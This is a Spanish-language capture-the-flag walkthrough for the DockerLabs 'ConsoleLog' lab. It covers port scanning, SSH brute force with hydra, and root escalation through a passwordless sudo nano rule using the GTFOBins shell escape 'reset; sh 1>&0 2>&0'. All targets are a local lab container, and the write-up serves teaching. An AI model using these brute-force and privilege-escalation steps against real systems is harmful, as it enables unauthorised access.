## Introducción

Este documento presenta la resolución completa de la máquina **ConsoleLog**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone un servidor web que contiene un mensaje en la consola del navegador y un directorio `/backend` que expone archivos JavaScript de una aplicación Node.js. Estos archivos revelan credenciales que permiten identificar un usuario válido mediante fuerza bruta.
Tras acceder al sistema vía SSH, se identifica una configuración insegura de `sudo` que permite ejecutar `nano` como root sin autenticación, facilitando la escalada de privilegios mediante técnicas de GTFOBins para obtener acceso completo como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip ConsoleLog.zip
sudo bash auto_deplo.sh ConsoleLog.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p ConsoleLog/{content,exploits,nmap,scripts}
cd ConsoleLog
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP
* **3000/tcp** — HTTP (Node.js)

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1750750715/Ports_itnuf6.png)

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Fuerza bruta con Hydra

No se identificaron formularios explotables ni rutas vulnerables directamente. Se opta por probar autenticación por fuerza bruta a través del servicio SSH utilizando `hydra`:

```bash
hydra -L /usr/share/wordlists/rockyou.txt \
      -p contraseña_conocida ssh://172.17.0.2 -t 4
```

![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1750750714/Hydra_jwadsv.png)

### 2.2 Acceso SSH

Una vez identificado el usuario válido, se accede vía SSH:

```bash
ssh usuario@172.17.0.2
```

![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1750750718/Ssh_e1ud70.png)

## Paso 3 — Escalada de privilegios

### 3.1 De usuario → root

Se verifican los permisos sudo:

```bash
sudo -l
```

Se indica que el usuario puede ejecutar `nano` como superusuario sin necesidad de contraseña:

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1750750718/Sudo-L_twddvq.png)

Se utiliza `searchbins` para verificar si existe una ruta en GTFOBins para `nano`:

```bash
searchbins -b nano -f sudo
```

![Searchbins](https://res.cloudinary.com/dewqswzke/image/upload/v1750750716/SearchBins_tcjxvv.png)

Se ejecuta `nano` con privilegios:

```bash
sudo nano
```

Dentro de nano, se presiona `Ctrl+R`, luego `Ctrl+X`, y se escribe:

```
reset; sh 1>&0 2>&0
```

Se pulsa `Enter` y se obtiene acceso como superusuario:

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1750750715/Root_g0iqsq.png)
